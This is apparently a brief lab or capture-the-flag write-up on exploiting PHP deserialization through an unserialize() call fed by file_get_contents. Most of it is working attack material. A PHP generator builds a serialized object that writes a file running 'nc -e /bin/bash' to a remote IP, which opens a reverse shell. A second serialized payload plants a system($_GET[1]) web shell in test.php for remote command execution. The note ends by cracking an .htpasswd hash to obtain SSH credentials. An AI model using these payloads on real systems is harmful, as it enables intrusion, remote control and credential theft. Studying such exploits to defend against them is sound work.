# De-serialization(php)
If there is a `unserialize` function being called with a user controlled parameter, then we can exploit php de-serialization. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable u`nserialize()` call, resulting in an arbitrary PHP object(s) injection into the application scope. In our code the application takes a file name, which gets read using PHP `file_get_contents` function. The output is then fed to php unserialize module.

```text-plain
<?php
class file
{
 public $file = 'n.php';
 public $data = '<?php shell_exec("nc -e /bin/bash 10.17.17.11 1234"); ?>';
}
echo (serialize(new file));
?>
```

run the above payload and save the serialized output as `shell.txt` and upload with [`http://10.17.17.11/shell.txt`](http://10.17.17.11/shell.txt) argument to `file_get_contents`, then run the created file `n.php` to get a reverse shell.

The payload is:

```text-plain
O:10:"FormSubmit":2:{s:9:"form_file";s:8:"test.php";s:7:"message";s:26:"<?php+system($_GET[1]);+?>";}
```

rce on /test.php?1=ls 

there's a hash file(.htpasswd), cracking it gives ssh creds